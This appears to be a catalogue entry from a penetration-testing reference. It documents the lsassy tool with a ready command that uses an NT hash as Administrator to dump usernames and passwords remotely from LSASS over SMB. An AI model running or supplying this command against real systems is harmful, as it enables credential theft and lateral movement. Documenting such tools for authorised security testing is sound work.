---
title: |
  Extract Credentials Remotely (NT Hash Auth)
description: |
  Python tool to remotely extract credentials on a set of hosts. This tool uses impacket project to remotely read necessary bytes in lsass dump and pypykatz to extract credentials.

command: |
  lsassy –hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.test.local
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
attack_types:
  - Enumeration
references:
  - https://github.com/Hackndo/lsassy
  - https://en.hackndo.com/remote-lsass-dump-passwords/
---
